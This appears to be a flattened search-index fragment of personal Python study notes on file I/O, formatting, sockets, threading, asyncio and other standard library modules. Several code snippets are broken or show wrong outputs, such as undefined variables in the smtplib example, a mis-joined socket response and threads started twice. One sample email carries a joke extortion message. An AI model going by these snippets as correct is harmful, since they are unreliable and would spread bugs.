r = format(x, '010b')       # r = '0000101010'</p> <p>y = 3.1415926 r = format(y, '10.2f')      # r = '      3.14' r = format(y, '10.2e')      # r = '  3.14e+00' r = format(y, '+10.2f')     # r = '     +3.14' r = format(y, '+010.2f')    # r = '+000003.14' r = format(y, '+10.2%')     # r = '  +314.16%'</p> <p>f'Value is {x:0.2f}'        # 'Value is 123.46' f'Value is {x:10.4f}'       # 'Value is   123.4560' f'Value is {2x:&lt;10.2f}'   # 'Value is 246.91****'</p> <p>f'{x!r:spec}'      # Calls (repr(x).format('spec')) f'{x!s:spec}'      # Calls (str(x).format('spec'))</p> <p>'Value is {:0.2f}' .format(x)            # 'Value is 123.46' 'Value is {0:10.2f}' .format(x)          # 'Value is   123.4560' 'Value is {val:&lt;10.2f}' .format(val=x)  # 'Value is 123.46***'</p> <p>Unlike f-strings, the arg value of a specifier cannot be an arbitrary expression, so it\u2019s not quite as expressive. However, the format() method can perform limited attribute lookup, indexing, and nested substitutions. For example:</p> <p>y = 3.1415926 width = 8 precision=3</p> <p>r = 'Value is {0:{1}.{2}f}'.format(y, width, precision)</p> <p>d = {    'name': 'IBM',    'shares': 50,    'price': 490.1 } r = '{0[shares]:d} shares of {0[name]} at {0[price]:0.2f}'.format(d)</p>"},{"location":"python/modules/io/#r-50-shares-of-ibm-at-49010","title":"r = '50 shares of IBM at 490.10'","text":"<p>command line arguments</p> <p>def main(argv):     if len(argv) != 3:         raise SystemExit(               f'Usage : python {argv[0]} inputfile outputfile\\n')     inputfile  = argv[1]     outputfile = argv[2]     ...</p> <p>if name == 'main':     import sys     main(sys.argv)</p> <p>import argparse</p> <p>def main(argv):     p = argparse.ArgumentParser(description='This is some program')</p> <pre><code># A positional argument\np.add_argument('infile')\n\n# An option taking an argument\np.add_argument('-o','--output', action='store')\n\n# An option that sets a boolean flag\np.add_argument('-d','--debug', action='store_true', default=False)\n\n# Parse the command line\nargs = p.parse_args(args=argv)\n\n# Retrieve the option settings\ninfile    = args.infile\noutput    = args.output\ndebugmode = args.debug\n\nprint(infile, output, debugmode)\n</code></pre> <p>if name == 'main':     import sys     main(sys.argv[1:])</p> <p>env variables</p> <p>import os path = os.environ['PATH'] user = os.environ['USER'] editor = os.environ['EDITOR'] val = os.environ['SOMEVAR']</p> <p>buffering</p> <p>By default, files are opened with I/O buffering enabled. With I/O buffering, I/O operations are performed in larger chunks to avoid excessive system calls. For example, write operations would start filling an internal memory buffer and output would only actually occur when the buffer is filled up. This behavior can be changed by giving a buffering argument to open(). For example</p> <p>with open('data.bin', 'wb', buffering=0) as file:     file.write(data)     file.write(data)     file.write(data)     file.flush()       # Make sure all data is written from buffers</p> <p>text mode enxoding</p> <p>with open('file.txt', 'rt',           encoding='utf-8', errors='replace') as file:     data = file.read()</p> <p>newline</p> <p>With text files, one complication is the encoding of newline characters. Newlines are encoded as '\\n', '\\r\\n', or '\\r' depending on the host operating system\u2014for example, '\\n' on UNIX and '\\r\\n' on Windows. By default, Python translates all of these line endings to a standard '\\n' character when reading. On writing, newline characters are translated back to the default line ending used on the system. The behavior is sometimes referred to as \u201cuniversal newline mode\u201d in Python documentation.</p> <p>file = open('somefile.txt', 'rt', newline='\\r\\n')</p> <p>behind in scenes</p> <p>The open() function serves as a kind of high-level factory function for creating instances of different I/O classes. These classes embody the different file modes, encodings, and buffering behaviors. They are also composed together in layers. The following classes are defined in the io module:</p> <p>Click here to view code image</p> <p>FileIO(filename, mode='r', closefd=True, opener=None) Opens a file for raw unbuffered binary I/O. filename is any valid filename accepted by the open() function. Other arguments have the same meaning as for open().</p> <p>Click here to view code image</p> <p>BufferedReader(file [, buffer_size]) BufferedWriter(file [, buffer_size]) BufferedRandom(file,[, buffer_size]) Implements a buffered binary I/O layer for a file. file is an instance of FileIO. buffer_size specifies the internal buffer size to use. The choice of class depends on whether or not the file is reading, writing, or updating data. The optional buffer_size argument specifies the internal buffer size used.</p> <p>Click here to view code image</p> <p>TextIOWrapper(buffered, [encoding, [errors [, newline [, line_buffering [, write_through]]]]]) Implements text mode I/O. buffered is a buffered binary mode file, such as BufferedReader or BufferedWriter. The encoding, errors, and newline arguments have the same meaning as for open(). line_buffering is a Boolean flag that forces I/O to be flushed on newline characters (False by default). write_through is a Boolean flag that forces all writes to be flushed (False by default).</p> <p>Here is an example that shows how a text-mode file is constructed, layer-by-layer:</p> <p>Click here to view code image</p> <pre><code>        raw = io.FileIO('filename.txt', 'r') # Raw-binary mode buffer = io.BufferedReader(raw) # Binary buffered reader file = io.TextIOWrapper(buffer, encoding='utf-8') # Text mode\n</code></pre> <p>file methods</p> <p>f.readable()</p> <p>Returns True if file can be read.</p> <p>f.read([n])</p> <p>Reads at most n bytes.</p> <p>f.readline([n])</p> <p>Reads a single line of input up to n characters. If n is omitted, this method reads the entire line.</p> <p>f.readlines([size])</p> <p>Reads all the lines and returns a list. size optionally specifies the approximate number of characters to read on the file before stopping.</p> <p>f.readinto(buffer)</p> <p>Reads data into a memory buffer.</p> <p>f.writable()</p> <p>Returns True if file can be written.</p> <p>f.write(s)</p> <p>Writes string s.</p> <p>f.writelines(lines)</p> <p>Writes all strings in iterable lines.</p> <p>f.close()</p> <p>Closes the file.</p> <p>f.seekable()</p> <p>Returns True if file supports random-access seeking.</p> <p>f.tell()</p> <p>Returns the current file pointer.</p> <p>f.seek(offset [, where])</p> <p>Seeks to a new file position.</p> <p>f.isatty()</p> <p>Returns True if f is an interactive terminal.</p> <p>f.flush()</p> <p>Flushes the output buffers.</p> <p>f.truncate([size])</p> <p>Truncates the file to at most size bytes.</p> <p>f.fileno()</p> <p>Returns an integer file descriptor. file attributes</p> <p>f.closed</p> <p>Boolean value indicates the file state: False if the file is open, True if closed.</p> <p>f.mode</p> <p>The I/O mode for the file.</p> <p>f.name</p> <p>Name of the file if created using open(). Otherwise, it will be a string indicating the source of the file.</p> <p>f.newlines</p> <p>The newline representation actually found in the file. The value is either None if no newlines have been encountered, a string containing '\\n', '\\r', or '\\r\\n', or a tuple containing all the different newline encodings seen.</p> <p>f.encoding</p> <p>A string that indicates file encoding, if any (for example, 'latin-1' or 'utf-8'). The value is None if no encoding is being used.</p> <p>f.errors</p> <p>The error handling policy.</p> <p>f.write_through</p> <p>Boolean value indicating if writes on a text file pass data directly to the underlying binary level file without buffering. stdin, stdout, stderr</p> <p>import sys sys.stdout.write('Enter your name : ') name = sys.stdin.readline()</p> <p>If necessary, the values of sys.stdout, sys.stdin, and sys.stderr can be replaced with other file objects, in which case the print() and input() functions will use the new values. Should it ever be necessary to restore the original value of sys.stdout, it should be saved first. The original values of sys.stdout, sys.stdin, and sys.stderr at interpreter startup are also available in sys.stdout, sys.stdin, and sys.stderr, respectively.</p> <p>directories</p> <p>import os</p> <p>names = os.listdir('dirname') for name in names:     print(name)</p> <p>print</p> <p>print('The values are', x, y, z)</p>"},{"location":"python/modules/io/#suppress-the-newline","title":"Suppress the newline","text":"<p>print('The values are', x, y, z, end='') To redirect the output to a file, use the file keyword argument:</p>"},{"location":"python/modules/io/#redirect-to-file-object-f","title":"Redirect to file object f","text":"<p>print('The values are', x, y, z, file=f) To change the separator character between items, use the sep keyword argument:</p>"},{"location":"python/modules/io/#put-commas-between-the-values","title":"Put commas between the values","text":"<p>print('The values are', x, y, z, sep=',')</p> <p>consume input</p> <p>use advance generator for io</p> <p>def line_receiver():     data = bytearray()     line = None     linecount = 0     while True:         part = yield line         linecount += part.count(b'\\n')         data.extend(part)         if linecount &gt; 0:             index = data.index(b'\\n')             line = bytes(data[:index+1])             data = data[index+1:]             linecount -= 1         else:             line = None</p> <p>r = line_receiver() r.send(None)    # Necessary first step r.send(b'hello') r.send(b'world\\nit ') b'hello world\\n' r.send(b'works!') r.send(b'\\n') b'it works!\\n'' </p> <p>An interesting side effect of this approach is that it externalizes the actual I/O operations that must be performed to get the input data. Specifically, the implementation of line_receiver() contains no I/O operations at all! This means that it could be used in different contexts. For example, with sockets:</p> <p>r = line_receiver() data = None while True:     while not (line:=r.send(data)):         data = sock.recv(8192)</p> <pre><code># Process the line\n...\n</code></pre> <p>r = line_receiver() data = None while True:     while not (line:=r.send(data)):         data = file.read(10000)</p> <pre><code># Process the line\n...\n</code></pre> <p>async def reader(ch):     r = line_receiver()     data = None     while True:         while not (line:=r.send(data)):             data = await ch.receive(8192)</p> <p>object serializations</p> <p>Sometimes it\u2019s necessary to serialize the representation of an object so it can be transmitted over the network, saved to a file, or stored in a database. One way to do this is to convert data into a standard encoding such as JSON or XML. There is also a common Python-specific data serialization format called Pickle.</p> <p>The pickle module serializes an object into a stream of bytes that can be used to reconstruct the object at a later point in time. The interface to pickle is simple, consisting of two operations, dump() and load(). For example, the following code writes an object to a file:</p> <p>import pickle obj = SomeObject() with open(filename, 'wb') as file:    pickle.dump(obj, file)      # Save object on f To restore the object, use:</p> <p>Click here to view code image</p> <p>with open(filename, 'rb') as file:     obj = pickle.load(file)   # Restore the object</p> <p>It is not normally necessary for user-defined objects to do anything extra to work with pickle. However, certain kinds of objects can\u2019t be pickled. These tend to be objects that incorporate runtime state\u2014open files, threads, closures, generators, and so on. To handle these tricky cases, a class can define the special methods getstate() and setstate().</p> <p>The getstate() method, if defined, will be called to create a value representing the state of an object. The value returned by getstate() is typically a string, tuple, list, or dictionary. The setstate() method receives this value during unpickling and should restore the state of an object from it.</p> <p>do not unpickle unknow data blocking operations and concurency</p> <p>A fundamental aspect of I/O is the concept of blocking. By its very nature, I/O is connected to the real world. It often involves waiting for input or devices to be ready. For example, code that reads data on the network might perform a receive operation on a socket like this:</p> <p>data = sock.recv(8192)</p> <p>def reader1(sock):     while (data := sock.recv(8192)):         print('reader1 got:', data)</p> <p>def reader2(sock):     while (data := sock.recv(8192)):         print('reader2 got:', data)</p>"},{"location":"python/modules/io/#problem-how-to-make-reader1-and-reader2","title":"Problem: How to make reader1() and reader2()","text":""},{"location":"python/modules/io/#run-at-the-same-time","title":"run at the same time?","text":"<p>The rest of this section outlines a few different approaches to solving this problem. However, it is not meant to be a full tutorial on concurrency. For that, you will need to consult other resources.</p> <p>nonblocking io</p> <p>def run(sock1, sock2):     sock1.setblocking(False)     sock2.setblocking(False)     while True:         reader1(sock1)         reader2(sock2) In practice, relying only on nonblocking I/O is clumsy and inefficient. For example, the core of this program is the run() function at the end. It will run in a inefficient busy loop as it constantly tries to read on the sockets. This works, but it is not a good design.</p> <p>IO polling</p> <p>Instead of relying upon exceptions and spinning, it is possible to poll I/O channels to see if data is available. The select or selectors module can be used for this purpose. For example, here\u2019s a slightly modified version of the run() function:</p> <p>from selectors import DefaultSelector, EVENT_READ, EVENT_WRITE</p> <p>def run(sock1, sock2):     selector = DefaultSelector()     selector.register(sock1, EVENT_READ, data=reader1)     selector.register(sock2, EVENT_READ, data=reader2)     # Wait for something to happen     while True:         for key, evt in selector.select():             func = key.data             func(key.fileobj)</p> <p>In this code, the loop dispatches either reader1() or reader2() function as a callback whenever I/O is detected on the appropriate socket. The selector.select() operation itself blocks, waiting for I/O to occur. Thus, unlike the previous example, it won\u2019t make the CPU furiously spin.</p> <p>This approach to I/O is the foundation of many so-called \u201casync\u201d frameworks such as asyncio, although you usually don\u2019t see the inner workings of the event loop. threading</p> <p>import threading</p> <p>def reader1(sock):     while (data := sock.recv(8192)):         print('reader1 got:', data)</p> <p>def reader2(sock):     while (data := sock.recv(8192)):         print('reader2 got:', data)</p> <p>t1 = threading.Thread(target=reader1, args=[sock1]).start() t2 = threading.Thread(target=reader2, args=[sock2]).start()</p>"},{"location":"python/modules/io/#start-the-threads","title":"Start the threads","text":"<p>t1.start() t2.start()</p>"},{"location":"python/modules/io/#wait-for-the-threads-to-finish","title":"Wait for the threads to finish","text":"<p>t1.join() t2.join()</p> <p>asyncio</p> <p>import asyncio</p> <p>async def reader1(sock):     loop = asyncio.get_event_loop()     while (data := await loop.sock_recv(sock, 8192)):         print('reader1 got:', data)</p> <p>async def reader2(sock):     loop = asyncio.get_event_loop()     while (data := await loop.sock_recv(sock, 8192)):         print('reader2 got:', data)</p> <p>async def main(sock1, sock2):     loop = asyncio.get_event_loop()     t1 = loop.create_task(reader1(sock1))     t2 = loop.create_task(reader2(sock2))</p> <pre><code># Wait for the tasks to finish\nawait t1\nawait t2\n</code></pre> <p>...</p>"},{"location":"python/modules/io/#run-it","title":"Run it","text":"<p>asyncio.run(main(sock1, sock2))</p> <p>asyncio tcp socket</p> <p>import asyncio from socket import *</p> <p>async def echo_server(address):     loop = asyncio.get_event_loop()     sock = socket(AF_INET, SOCK_STREAM)     sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)     sock.bind(address)     sock.listen(5)     sock.setblocking(False)     print('Server listening at', address)     with sock:         while True:             client, addr = await loop.sock_accept(sock)             print('Connection from', addr)             loop.create_task(echo_client(loop, client))</p> <p>async def echo_client(loop, client):     with client:         while True:             data = await loop.sock_recv(client, 10000)             if not data:                 break             await loop.sock_sendall(client, b'Got:' + data)     print('Connection closed')</p> <p>if name == 'main':     loop = asyncio.get_event_loop()     loop.create_task(echo_server(loop, ('', 25000)))     loop.run_forever()</p> <p>To test this code, use a program such as nc or telnet to connect to port 25000 on your machine. The code should echo back the text that you type. If you connect more than once using multiple terminal windows, you\u2019ll find that the code can handle all of the connections concurrently.</p> <p>Most applications using asyncio will probably operate at a higher level than sockets. However, in such applications, you will still have to make use of special async functions and interact with the underlying event loop in some manner. binascii</p> <p>converts binary data into text repr</p> <p>binascii.b2a_hex(b'hello') b'68656c6c6f'</p> <pre><code>        binascii.a2b_hex() b'hello' binascii.b2a_base64(b'hello') b'aGVsbG8=\\n' binascii.a2b_base64()\n</code></pre> <p>cgi module</p> <p>    To register, please provide a contact name and email address.    </p> Your name: Your email: <p>Here\u2019s a CGI script that receives the form data on the other end:</p> <p>Click here to view code image</p>"},{"location":"python/modules/io/#usrbinenv-python","title":"!/usr/bin/env python","text":"<p>import cgi try:     form = cgi.FieldStorage()     name = form.getvalue('name')     email = form.getvalue('email')     # Validate the responses and do whatever     ...     # Produce an HTML result (or redirect)     print('Status: 302 Moved\\r')     print('Location: https://www.mywebsite.com/thanks.html\\r')     print('\\r') except Exception as e:     print('Status: 501 Error\\r')     print('Content-type: text/plain\\r')     print('\\r')     print('Some kind of error occurred.\\r') Will writing such a CGI script get you a job at an Internet startup? Probably not. Will it solve your actual problem? Likely.</p> <p>configparser</p> <p>; A comment [section1] name1 = value1 name2 = value2</p> <p>[section2] ; Alternative syntax name1: value1 name2: value2</p> <p>cfg = configparser.ConfigParser() cfg.read('conig.ini')</p>"},{"location":"python/modules/io/#extract-values","title":"Extract values","text":"<p>a = cfg.get('section1', 'name1') b = cfg.get('section2', 'name2')</p> <p>errorno</p> <p>so much error handlerrs fcntl module</p> <p>low level io tool</p> <p>open file with lock to avoid concurent open</p> <p>import fcntl</p> <p>with open('somefile', 'r') as file:      try:          fcntl.flock(file.fileno(), fcntl.LOCK_EX)          # Use the file          ...      finally:          fcntl.flock(file.fileno(), fcntl.LOCK_UN)</p> <p>hashlib</p> <p>The hashlib module provides functions for computing cryptographic hash values such as MD5 and SHA-1. The following example illustrates how to use the module:</p> <p>Click here to view code image</p> <pre><code>        h = hashlib.new('sha256') h.update(b'Hello') # Feed data h.update(b'World') h.digest() b'\\xa5\\x91\\xa6\\xd4\\x0b\\xf4 @J\\x01\\x173\\xcf\\xb7\\xb1\\x90\\xd6,e\\xbf\\x0b\\xcd\\xa3+W\\xb2w\\xd9\\xad\\x9f\\x14n h.hexdigest() 'a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e' h.digest_size 32\n</code></pre> <p>https package io</p> <p>The io module primarily contains the definitions of classes used to implement the file objects as returned by the open() function. It is not so common to access those classes directly. However, the module also contains a pair of classes that are useful for \u201cfaking\u201d a file in the form of strings and bytes. This can be useful for testing and other applications where you need to provide a \u201cfile\u201d but have obtained data in a different way.</p> <p>The StringIO() class provides a file-like interface on top of strings. For example, here is how you can write output to a string:</p> <p>import io file = io.StringIO() greeting(file)</p>"},{"location":"python/modules/io/#get-the-resulting-output","title":"Get the resulting output","text":"<p>output = file.getvalue()</p> <p>logging</p> <p>The logging module is the de facto standard module used for reporting program diagnostics and for print-style debugging. It can be used to route output to a log file and provides a large number of configuration options. A common practice is to write code that creates a Logger instance and issues messages on it like this:</p> <p>Click here to view code image</p> <p>import logging log = logging.getLogger(name)</p>"},{"location":"python/modules/io/#function-that-uses-logging","title":"Function that uses logging","text":"<p>def func(args):     log.debug('A debugging message')     log.info('An informational message')     log.warning('A warning message')     log.error('An error message')     log.critical('A critical message')</p>"},{"location":"python/modules/io/#configuration-of-logging-occurs-one-at-program-startup","title":"Configuration of logging (occurs one at program startup)","text":"<p>if name == 'main':     logging.basicConfig(          level=logging.WARNING,          filename='output.log'     )</p> <p>There are five built-in levels of logging ordered by increasing severity. When configuring the logging system, you specify a level that acts as a filter. Only messages at that level or greater severity are reported. Logging provides a large number of configuration options, mostly related to the back-end handling of the log messages. Usually you don\u2019t need to know about that when writing application code\u2014you use debug(), info(), warning(), and similar methods on some given Logger instance. Any special configuration takes place during program startup in a special location (such as a main() function or the main code block).</p> <p>pathlib</p> <p>from pathlib import Path</p> <p>filename = Path('/Users/beazley/old/data.csv') Once you have an instance filename of Path, you can perform various operations on it to manipulate the filename. For example:</p> <p>Click here to view code image</p> <p>filename.name 'data.csv' filename.parent Path('/Users/beazley/old') filename.parent / 'newfile.csv' Path('/Users/beazley/old/newfile.csv') filename.parts ('/', 'Users', 'beazley', 'old', 'data.csv') filename.with_suffix('.csv.clean') Path('/Users/beazley/old/data.csv.clean') </p> <p>import pathlib</p> <p>def compute_usage(filename):     pathname = pathlib.Path(filename)     if pathname.is_file():         return pathname.stat().st_size     elif pathname.is_dir():         return sum(path.stat().st_size                    for path in pathname.rglob('*')                    if path.is_file())         return pathname.stat().st_size     else:         raise RuntimeError('Unsupported file kind')</p> <p>re</p> <p>regex shutil</p> <p>some shell commadns</p> <p>import shutil</p> <p>shutil.copy(srcfile, dstfile) To move a file:</p> <p>Click here to view code image</p> <p>shutil.move(srcfile, dstfile) To copy a directory tree:</p> <p>Click here to view code image</p> <p>shutil.copytree(srcdir, dstdir) To remove a directory tree:</p> <p>shutil.rmtree(pathname) The shutil module is often used as a safer and more portable alternative to directly executing shell commands with the os.system() function. select</p> <p>The select module is used for simple polling of multiple I/O streams. That is, it can be used to watch a collection of file descriptors for incoming data or for the ability to receive outgoing data. The following example shows typical usage:</p> <p>import select</p>"},{"location":"python/modules/io/#collections-of-objects-representing-file-descriptors-must-be","title":"Collections of objects representing file descriptors.  Must be","text":""},{"location":"python/modules/io/#integers-or-objects-with-a-fileno-method","title":"integers or objects with a fileno() method.","text":"<p>want_to_read = [ ... ] want_to_write = [ ... ] check_exceptions = [ ... ]</p>"},{"location":"python/modules/io/#timeout-or-none","title":"Timeout (or None)","text":"<p>timeout = None</p>"},{"location":"python/modules/io/#poll-for-io","title":"Poll for I/O","text":"<p>can_read, can_write, have_exceptions = \\     select.select(want_to_read, want_to_write, check_exceptions, timeout)</p>"},{"location":"python/modules/io/#perform-io-operations","title":"Perform I/O operations","text":"<p>for file in can_read:     do_read(file) for file in can_write:     do_write(file)</p>"},{"location":"python/modules/io/#handle-exceptions","title":"Handle exceptions","text":"<p>for file in have_exceptions:     handle_exception(file)</p> <p>smtlib</p> <p>import smtplib</p> <p>fromaddr = 'someone@some.com' toaddrs = ['recipient@other.com' ] amount = 123.45 msg = f'''From: {fromaddr}\\r \\r Pay {amount} bitcoin or else.  We're watching.\\r '''</p> <p>server = smtplib.SMTP('localhost') serv.sendmail(fromaddr, toaddrs, msg) serv.quit()</p> <p>socket</p> <p>use telnet or nc</p> <p>from socket import socket, AF_INET, SOCK_STREAM</p> <p>sock = socket(AF_INET, SOCK_STREAM) sock.connect(('python.org', 80)) sock.send(b'GET /index.html HTTP/1.0\\r\\n\\r\\n') parts = [] while True:     part = sock.recv(10000)     if not part:         break     parts.append(part) response = b''.join(part) print(part)</p> <p>struct</p> <p>The struct module is used to convert data between Python and binary data structures, represented as Python byte strings. These data structures are often used when interacting with functions written in C, binary file formats, network protocols, or binary communication over serial ports.</p> <p>As an example, suppose you need to construct a binary message with its format described by a C data structure:</p> <p>Click here to view code image Message format: All values are 'big endian'</p> <p>struct Message { unsigned short msgid; // 16 bit unsigned integer unsigned int sequence; // 32 bit sequence number float x; // 32 bit float float y; // 32 bit float } subprocess</p> <p>import subprocess</p>"},{"location":"python/modules/io/#run-the-netstat-a-command-and-collect-its-output","title":"Run the 'netstat -a' command and collect its output","text":"<p>try:     out = subprocess.check_output(['netstat', '-a']) except subprocess.CalledProcessError as e:     print('It failed:', e) The data returned by check_output() is presented as bytes. If you want to convert it to text, make sure you apply a proper decoding:</p> <p>Click here to view code image</p> <p>text = out.decode('utf-8') It is also possible to set up a pipe and to interact with a subprocess in a more detailed manner. To do that, use the Popen class like this:</p> <p>Click here to view code image</p> <p>import subprocess</p> <p>p = subprocess.Popen(['wc'],                      stdin=subprocess.PIPE,                      stdout=subprocess.PIPE)</p>"},{"location":"python/modules/io/#send-data-to-the-subprocess","title":"Send data to the subprocess","text":"<p>p.stdin.write(b'hello world\\nthis is a test\\n') p.stdin.close()</p>"},{"location":"python/modules/io/#read-data-back","title":"Read data back","text":"<p>out = p.stdout.read() print(out)</p> <p>tmpfile</p> <p>temp files textwrap</p> <p>wrapped = textwrap.wrap(text, width=81) print('\\n'.join(wrapped))</p> <p>threading</p> <p>threads</p> <p>import threading import time</p> <p>def countdown(n):     while n &gt; 0:         print('T-minus', n)         n -= 1         time.sleep(1)</p> <p>t = threading.Thread(target=countdown, args=[10]) t.start() t.join()      # Wait for the thread to finish If you\u2019re never going to wait for the thread to finish, make it daemonic by supplying an extra daemon flag like this:</p> <p>Click here to view code image</p> <p>t = threading.Thread(target=countdown, args=[10], daemon=True)</p>"},{"location":"python/modules/io/#to-stop","title":"to stop","text":"<p>import threading import time</p> <p>must_stop = False</p> <p>def countdown(n):     while n &gt; 0 and not must_stop:         print('T-minus', n)         n -= 1         time.sleep(1)</p> <p>thread lock</p> <p>import threading</p> <p>class Counter:     def init(self):         self.value = 0         self.lock = threading.Lock()</p> <pre><code>def increment(self):\n    with self.lock:\n         self.value += 1\n\ndef decrement(self):\n    with self.lock:\n         self.value -= 1\n</code></pre> <p>threading event</p> <p>def step1(evt):     print('Step 1')     time.sleep(5)     evt.set()</p> <p>def step2(evt):     evt.wait()     print('Step 2')</p> <p>evt = threading.Event() threading.Thread(target=step1, args=[evt]).start() threading.Thread(target=step2, args=[evt]).start()</p> <p>thread queue</p> <p>import threading import queue import time</p> <p>def producer(q):     for i in range(10):         print('Producing:', i)         q.put(i)     print('Done')     q.put(None)</p> <p>def consumer(q):     while True:         item = q.get()         if item is None:             break         print('Consuming:', item)     print('Goodbye')</p> <p>q = queue.Queue() threading.Thread(target=producer, args=[q]).start() threading.Thread(target=consumer, args=[q]).start()</p> <p>time</p> <p>The time module is used to access system time-related functions. The following selected functions are the most useful:</p> <p>sleep(seconds) Make Python sleep for a given number of seconds, given as a floating point.</p> <p>time() Return the current system time in UTC as a floating-point number. This is the number of seconds since the epoch (usually January 1, 1970 for UNIX systems). Use localtime() to convert it into a data structure suitable for extracting useful information.</p> <p>localtime([secs]) Return a struct_time object representing the local time on the system or the time represented by the floating-point value secs passed as an argument. The resulting struct has attributes tm_year, tm_mon, tm_mday, tm_hour, tm_min, tm_sec, tm_wday, tm_yday, and tm_isdst.</p> <p>gmtime([secs]) The same as localtime() except that the resulting structure represents the time in UTC (or Greenwich Mean Time).</p> <p>ctime([secs]) Convert a time represented as seconds to a text string suitable for printing. Useful for debugging and logging.</p> <p>asctime(tm) Convert a time structure as represented by localtime() into a text string suitable for printing.</p> <p>The datetime module is more generally used for representing dates and times for the purpose of performing date-related computations and dealing with timezones. urllib</p> <p>from urllib.request import urlopen u = urlopen('http://www.python.org') data = u.read()</p> <p>If you want to encode form parameters, you can use urllib.parse.urlencode() as shown here:</p> <p>Click here to view code image</p> <p>from urllib.parse import urlencode from urllib.request import urlopen</p> <p>form = {    'name': 'Mary A. Python',    'email': 'mary123@python.org' }</p> <p>data = urlencode(form) u = urlopen('http://httpbin.org/post', data.encode('utf-8')) response = u.read() The urlopen() function works fine for basic webpages and APIs involving HTTP or HTTPS. However, it becomes quite awkward to use if access also involves cookies, advanced authentication schemes, and other layers. Frankly, most Python programmers would use a third-party library such as requests or httpx to handle these situations. You should too.</p> <p>The urllib.parse subpackage has additional functions for manipulating URLs themselves. For example, the urlparse() function can be used to pull apart a URL:</p> <p>Click here to view code image</p> <p>url = 'http://httpbin.org/get?name=Dave&amp;n=42' from urllib.parse import urlparse urlparse(url) ParseResult(scheme='http', netloc='httpbin.org', path='/get', params='', query='name=Dave&amp;n=42', fragment='') </p> <p>unicodedata</p> <p>for unicode strings</p> <p>unicodedata.normalize(option) xml</p> <p>from xml.etree.ElementTree import ElementTree</p> <p>doc = ElementTree(file='recipe.xml') title = doc.find('title') print(title.text)</p>"},{"location":"python/modules/io/#alternative-just-get-element-text","title":"Alternative (just get element text)","text":"<p>print(doc.findtext('description'))</p>"},{"location":"python/modules/io/#iterate-over-multiple-elements","title":"Iterate over multiple elements","text":"<p>for item in doc.findall('ingredients/item'):     num = item.get('num')     units = item.get('units', '')     text = item.text.strip()     print(f'{num} {units} {text}')</p> <p>I/O is a fundamental part of writing any useful program. Given its popularity, Python is able to work with literally any data format, encoding, or document structure that\u2019s in use. Although the standard library might not support it, you will almost certainly find a third-party module to solve your problem.</p> <p>In the big picture, it may be more useful to think about the edges of your application. At the outer boundary between your program and reality, it\u2019s common to encounter issues related to data encoding. This is especially true for textual data and Unicode. Much of the complexity in Python\u2019s I/O handling\u2014supporting different encoding, error handling policies, and so on\u2014is aimed at this specific problem. It\u2019s also critical to keep in mind that textual data and binary data are strictly separated. Knowing what you\u2019re working with helps in understanding the big picture.</p> <p>A secondary consideration in I/O is the overall evaluation model. Python code is currently separated into two worlds\u2014normal synchronous code and asynchronous code usually associated with the asyncio module (characterized by the use of async functions and the async/await syntax). Asynchronous code almost always requires using dedicated libraries that are capable of operating in that environment. This, in turn, forces your hand on writing your application code in the \u201casync\u201d style as well. Honestly, you should probably avoid asynchronous coding unless you absolutely know that you need it\u2014and if you\u2019re not really sure, then you almost certainly don\u2019t. Most of the well-adjusted Python-speaking universe codes in a normal synchronous style that is far easier to reason about, debug, and test. You should choose that.</p>"},{"location":"python/modules/modules/","title":"Overview","text":"<p>module</p> <p>d.py - is module Module caching</p> <p>import works only one time, but you can reload if needed u can import global variables with from the</p> <p>from d import GLOABL_VARIABLE control * import</p> <p>define all=[\"func\",\"SomeClass\"] circula import</p>"},{"location":"python/modules/modules/#modapy","title":"moda.py","text":"<p>import modb</p> <p>def func_a():     modb.func_b()</p> <p>class Base:     pass</p>"},{"location":"python/modules/modules/#-","title":"----------------------------","text":""},{"location":"python/modules/modules/#modbpy","title":"modb.py","text":"<p>import moda</p> <p>def func_b():     print('B')</p> <p>class Child(moda.Base):     pass</p> <p>There is a strange import order dependency in this code. Using import modb first works fine, but if you put import moda first, it blows up with an error about moda.Base being undefined.</p> <p>To understand what is happening, you have to follow the control flow. import moda starts executing the file moda.py. The first statement it encounters is import modb. Thus, control switches over to modb.py. The first statement in that file is import moda. Instead of entering a recursive cycle, that import is satisfied by the module cache and control continues on to the next statement in modb.py. This is good\u2014circular imports don\u2019t cause Python to deadlock or enter a new spacetime dimension. However, at this point in execution, module moda has only been partially evaluated. When control reaches the class Child(moda.Base) statement, it blows up. The required Base class hasn\u2019t been defined yet.</p> <p>One way to fix this problem is to move the import modb statement someplace else. For example, you could move the import into func_a() where the definition is actually needed: module reloading</p> <p>importlib.realod(requests) no c/ c++ extenstions compilation pychache</p> <p>When modules are first imported, they are compiled into an interpreter bytecode. This code is written to a .pyc file within a special pycache directory. This directory is usually found in the same directory as the original .py file. When the same import occurs again on a different run of the program, the compiled bytecode is loaded instead. This significantly speeds up the import process.</p> <p>The caching of bytecode is an automatic process that you almost never need to worry about. Files are automatically regenerated if the original source code changes. It just works.</p> <p>That said, there are still reasons to know about this caching and compilation process. First, sometimes Python files get installed (often accidentally) in an environment where users don\u2019t have operating system permissions to create the required pycache directory. Python will still work, but every import now loads the original source code and compiles it to bytecode. Program loading will be a lot slower than it needs to be. Similarly, in deploying or packaging a Python application, it may be advantageous to include the compiled bytecode, as that may significantly speed up program startup.</p> <p>The other good reason to know about module caching is that some programming techniques interfere with it. Advanced metaprogramming techniques involving dynamic code generation and the exec() function defeat the benefits of bytecode caching. A notable example is the use of dataclasses:</p> <p>Click here to view code image</p> <p>from dataclasses import dataclass</p> <p>@dataclass class Point: x: float y: float Dataclasses work by generating method functions as text fragments and executing them using exec(). None of this generated code is cached by the import system. For a single class definition, you won\u2019t notice. However, if you have a module consisting of 100 dataclasses, you might find that it imports nearly 20 times slower than a comparable module where you just wrote out the classes in the normal, if less compact, way. module search</p> <p>env PYTHONPATH=/some/path python3 script.py</p> <p>import sys sys.path.append('mymodules.zip') import foo, bar</p> <p>python execute directory</p> <p>myapp/ foo.py bar.py main.py You can run Python on it by typing python3 myapp. Execution will start in the main.py file. This also works if you turn the myapp directory into a ZIP archive. Typing python3 myapp.zip will look for a top-level main.py file and execute it if found. package</p> <p>graphics/ init.py primitive/ init.py lines.py fill.py text.py ... graph2d/ init.py plot2d.py ... graph3d/ init.py plot3d.py ... formats/ init.py gif.py png.py tiff.py jpeg.py</p> <p>Whenever any part of a package is first imported, code in the init.py file executes first (if it exists). As noted, this file may be empty, but it can also contain code to perform package-specific initializations. If importing a deeply nested submodule, all init.py files encountered in traversal of the directory structure are executed. Thus, the statement 